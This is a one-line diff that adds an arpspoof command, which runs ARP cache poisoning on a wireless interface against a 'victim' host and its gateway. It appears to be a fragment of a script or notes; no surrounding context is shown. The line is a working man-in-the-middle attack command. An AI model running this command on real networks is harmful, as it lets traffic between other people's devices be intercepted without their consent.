@@ -1,0 +1,1 @@
+arpspoof -i wlan0 -t victim -r gateway
